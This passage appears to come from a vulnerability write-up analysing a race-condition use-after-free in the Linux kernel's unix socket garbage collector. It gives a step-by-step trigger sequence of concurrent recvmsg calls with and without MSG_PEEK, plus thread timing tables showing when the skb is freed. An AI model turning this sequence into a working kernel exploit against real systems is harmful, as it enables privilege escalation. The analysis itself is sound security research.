 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c2">If the garbage collection process happens now, the kernel will do the following scrutiny:</span></p><ul style="padding: 0;" class="c27 lst-kix_h1p96gz9lzq4-0 start"><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span>List </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span>, </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span>, </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">0</span><span>, &nbsp;</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">1</span><span>, </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">3</span><span class="ykcrMYlEiJ-c11">1</span><span>, </span><span class="ykcrMYlEiJ-c15">&#x1d6fc;</span><span class="ykcrMYlEiJ-c2">&nbsp;as garbage candidates. Decrease inflight count for the candidate children in each receive queue.</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span>Since </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">2</span><span class="ykcrMYlEiJ-c11">1</span><span>&nbsp;is not considered a candidate, </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">1</span><span class="ykcrMYlEiJ-c2">&rsquo;s inflight count is still above zero.</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c2">Recursively restore the inflight count.</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c2">Nothing is considered garbage.</span></li></ul>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c2">A potential skb UAF by race condition can be triggered by:</span></p><ol class="c27 lst-kix_j5vmamheymgq-0 start" start="1"><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span>Call </span><span class="ykcrMYlEiJ-c3">recvmsg</span><span>&nbsp;with </span><span class="ykcrMYlEiJ-c3">MSG_PEEK</span><span>&nbsp;flag from </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">2</span><span class="ykcrMYlEiJ-c11">1</span><span>&nbsp;to get </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">1</span><span class="ykcrMYlEiJ-c2">&rsquo;.</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span>Call </span><span class="ykcrMYlEiJ-c3">recvmsg</span><span>&nbsp;with </span><span class="ykcrMYlEiJ-c3">MSG_PEEK</span><span>&nbsp;flag from </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">1</span><span>&nbsp;to get </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">0</span><span class="ykcrMYlEiJ-c2">&rsquo;.</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c2">Concurrently do the following operations:</span></li></ol><ol class="c27 lst-kix_j5vmamheymgq-1 start" start="1"><li style="margin-left: 46pt;" class="c12 c21 c20 li-bullet-0"><span>Call </span><span class="ykcrMYlEiJ-c3">recvmsg</span><span>&nbsp;without </span><span class="ykcrMYlEiJ-c3">MSG_PEEK</span><span>&nbsp;flag from </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">1</span><span>&nbsp;to get </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">0</span><span class="ykcrMYlEiJ-c2">&rsquo;&rsquo;.</span></li><li style="margin-left: 46pt;" class="c12 c20 c21 li-bullet-0"><span>Call </span><span class="ykcrMYlEiJ-c3">recvmsg</span><span>&nbsp;with </span><span class="ykcrMYlEiJ-c3">MSG_PEEK</span><span>&nbsp;flag from </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">0</span><span class="ykcrMYlEiJ-c2">&rsquo;</span></li></ol>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c2">How is it possible? Let&rsquo;s see a case where the race condition is not hit so there is no UAF:</span></p><a id="t.b47553220f0960b2834e887266a030fb4dc49b24"></a><a id="t.17"></a><table class="ykcrMYlEiJ-c33"><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c2">Thread 0</span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c2">Thread 1</span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c2">Thread 2</span></p></td></tr><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c2">Call unix_gc</span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td></tr><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span>Stage0: List </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span>, </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span>, </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">0</span><span>, &nbsp;</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">1</span><span>, </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">3</span><span class="ykcrMYlEiJ-c11">1</span><span>, </span><span class="ykcrMYlEiJ-c15">&#x1d6fc;</span><span class="ykcrMYlEiJ-c15">&nbsp;</span><span class="ykcrMYlEiJ-c2">as garbage candidates.</span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td></tr><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span>Call </span><span class="ykcrMYlEiJ-c3">recvmsg</span><span>&nbsp;with </span><span class="ykcrMYlEiJ-c3">MSG_PEEK</span><span>&nbsp;flag from </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">2</span><span class="ykcrMYlEiJ-c11">1</span><span>&nbsp;to get </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">1</span><span class="ykcrMYlEiJ-c2">&rsquo;</span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td></tr><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span>Increase reference count: </span><span class="ykcrMYlEiJ-c3">scm.fp = scm_fp_dup(</span><span class="ykcrMYlEiJ-c3">UNIXCB</span><span class="ykcrMYlEiJ-c3">(skb).fp);</span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td></tr><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c2">Stage0: decrease inflight count from the child of every garbage candidate</span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td></tr><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c2">Status after stage 0:</span></p>
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c8">inflight</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span class="ykcrMYlEiJ-c15">) = 0</span></p>
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c8">inflight</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span class="ykcrMYlEiJ-c15">) = 0</span></p>
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c8">inflight</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">0</span><span class="ykcrMYlEiJ-c15">) = 0</span></p>
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c8">inflight</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">1</span><span class="ykcrMYlEiJ-c15">) = 1</span></p>
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c8">inflight</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">3</span><span class="ykcrMYlEiJ-c11">1</span><span class="ykcrMYlEiJ-c15">) = 0</span></p>
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c8">inflight</span><span class="ykcrMYlEiJ-c15">(&#x1d6fc;) = 0</span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td></tr><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c2">Stage1: Recursively restore inflight count if a candidate still has inflight count. </span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td></tr><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c2">Stage1: All inflight counts have been restored.</span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td></tr><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c2">Stage2: No garbage, return.</span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td></tr><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span>Call </span><span class="ykcrMYlEiJ-c3">recvmsg</span><span>&nbsp;with </span><span class="ykcrMYlEiJ-c3">MSG_PEEK</span><span>&nbsp;flag from </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">1</span><span>&nbsp;to get </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">0</span><span class="ykcrMYlEiJ-c2">&rsquo;</span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td></tr><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span>Call </span><span class="ykcrMYlEiJ-c3">recvmsg</span><span>&nbsp;without </span><span class="ykcrMYlEiJ-c3">MSG_PEEK</span><span>&nbsp;flag from </span><span class="ykcrMYlEiJ-c8">f&#8239;</span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">1</span><span>&nbsp;to get </span><span class="ykcrMYlEiJ-c8">f&#8239;</span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">0</span><span class="ykcrMYlEiJ-c2">&rsquo;&rsquo;</span></p></td></tr><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span>Call </span><span class="ykcrMYlEiJ-c3">recvmsg</span><span>&nbsp;with </span><span class="ykcrMYlEiJ-c3">MSG_PEEK</span><span>&nbsp;flag from </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">0</span><span class="ykcrMYlEiJ-c2">&rsquo;</span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td></tr><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c2">Everyone is happy</span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c2">Everyone is happy</span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c2">Everyone is happy</span></p></td></tr></table>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>However, if the second </span><span class="ykcrMYlEiJ-c3">recvmsg</span><span>&nbsp;occurs </span><span>just after stage </span><span class="ykcrMYlEiJ-c2">1 of the garbage collection process, the UAF is triggered:</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p><a id="t.4cb3bda9bda9e3eb3317a2b662883e2cb8968cd6"></a><a id="t.18"></a><table class="ykcrMYlEiJ-c33"><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c2">Thread 0</span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c2">Thread 1</span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c2">Thread 2</span></p></td></tr><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c2">Call unix_gc</span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td></tr><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span>Stage0: List </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span>, </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span>, </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">0</span><span>, &nbsp;</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">1</span><span>, </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">3</span><span class="ykcrMYlEiJ-c11">1</span><span>, </span><span class="ykcrMYlEiJ-c15">&#x1d6fc;</span><span class="ykcrMYlEiJ-c15">&nbsp;</span><span class="ykcrMYlEiJ-c2">as garbage candidates.</span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td></tr><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span>Call </span><span class="ykcrMYlEiJ-c3">recvmsg</span><span>&nbsp;with </span><span class="ykcrMYlEiJ-c3">MSG_PEEK</span><span>&nbsp;flag from </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">2</span><span class="ykcrMYlEiJ-c11">1</span><span>&nbsp;to get </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">1</span><span class="ykcrMYlEiJ-c2">&rsquo;</span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td></tr><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span>Increase reference count: </span><span class="ykcrMYlEiJ-c3">scm.fp = scm_fp_dup(</span><span class="ykcrMYlEiJ-c3">UNIXCB</span><span class="ykcrMYlEiJ-c3">(skb).fp);</span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td></tr><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c2">Stage0: decrease inflight count from the child of every garbage candidates</span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td></tr><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c2">Status after stage 0:</span></p>
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c8">inflight</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span class="ykcrMYlEiJ-c15">) = 0</span></p>
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c8">inflight</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span class="ykcrMYlEiJ-c15">) = 0</span></p>
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c8">inflight</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">0</span><span class="ykcrMYlEiJ-c15">) = 0</span></p>
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c8">inflight</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">1</span><span class="ykcrMYlEiJ-c15">) = 1</span></p>
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c8">inflight</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">3</span><span class="ykcrMYlEiJ-c11">1</span><span class="ykcrMYlEiJ-c15">) = 0</span></p>
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c8">inflight</span><span class="ykcrMYlEiJ-c15">(&#x1d6fc;) = 0</span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td></tr><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c2">Stage1: Start restoring inflight count.</span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td></tr><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span>Call </span><span class="ykcrMYlEiJ-c3">recvmsg</span><span>&nbsp;with </span><span class="ykcrMYlEiJ-c3">MSG_PEEK</span><span>&nbsp;flag from </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">1</span><span>&nbsp;to get </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">0</span><span class="ykcrMYlEiJ-c2">&rsquo;</span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td></tr><tr class="ykcrMYlEiJ-c46"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span>Call </span><span class="ykcrMYlEiJ-c3">recvmsg</span><span>&nbsp;without </span><span class="ykcrMYlEiJ-c3">MSG_PEEK</span><span>&nbsp;flag from </span><span class="ykcrMYlEiJ-c8">f&#8239;</span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">1</span><span>&nbsp;to get </span><span class="ykcrMYlEiJ-c8">f&#8239;</span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">0</span><span class="ykcrMYlEiJ-c2">&rsquo;&rsquo;</span></p></td></tr><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c3">unix_detach_fds</span><span>: </span><span class="ykcrMYlEiJ-c3">UNIXCB</span><span class="ykcrMYlEiJ-c3">(skb).fp = NULL</span></p></td></tr><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span>Blocked by </span><span class="ykcrMYlEiJ-c3">spin_lock(&amp;unix_gc_lock)</span></p></td></tr><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span>Stage1: </span><span class="ykcrMYlEiJ-c3">scan_inflight</span><span>&nbsp;cannot find candidate children from </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">1</span><span class="ykcrMYlEiJ-c2">. Thus, the inflight count accidentally remains the same.</span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td></tr><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
